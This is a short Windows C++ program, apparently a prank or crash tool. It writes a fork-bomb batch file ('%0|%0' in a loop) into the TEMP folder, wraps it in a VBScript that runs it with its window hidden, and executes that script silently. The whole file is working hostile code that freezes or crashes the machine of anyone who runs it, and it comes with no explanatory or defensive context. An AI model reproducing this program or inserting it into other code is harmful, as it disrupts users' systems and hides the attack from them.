#include <fstream>
#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

int main() {

    const char* tempPath = getenv("TEMP");

    string batchFilePath = string(tempPath) + "\\crash.bat";
    ofstream crashbat(batchFilePath);
    crashbat << ":a" << endl;
    crashbat << "%0|%0" << endl;
    crashbat << "goto a";
    crashbat.close();

    string vbsFilePath = string(tempPath) + "\\crash.vbs";
    ofstream crashvbs(vbsFilePath);
    crashvbs << "Set objShell = CreateObject(\"WScript.Shell\")" << endl;
    crashvbs << "objShell.Run \"" + batchFilePath + "\", 0, False";
    crashvbs.close();

    string command = "cscript //B //Nologo \"" + vbsFilePath;

    int result = system(command.c_str());
    if (result == 0) {
        return 0;
    } else {
        return 1;
    }
}
